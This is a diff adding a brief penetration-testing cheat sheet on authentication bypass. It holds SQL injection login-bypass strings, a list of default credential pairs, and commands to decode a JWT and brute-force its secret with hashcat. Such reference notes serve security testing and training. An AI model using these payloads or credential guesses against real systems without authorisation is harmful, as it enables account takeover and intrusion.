@@ -1,0 +1,35 @@
+# Auth Bypass
+
+## SQL Injection
+
+Classic login bypass: the query becomes always-true when the comment terminates the password check.
+
+```
+admin'--
+' OR '1'='1'--
+admin' #
+```
+
+## Default Credentials
+
+Always try manufacturer and application defaults before anything else: a surprising number of targets never changed them.
+
+```
+admin:admin
+admin:password
+admin:123456
+root:root
+guest:guest
+```
+
+## JWT
+
+Decode the token to inspect claims and the algorithm, then attempt signature bypass or brute-force a weak secret.
+
+```bash
+# Decode
+echo <token> | cut -d. -f2 | base64 -d
+
+# Brute force secret
+hashcat -m 16500 <token> /usr/share/dict/rockyou.txt
+```
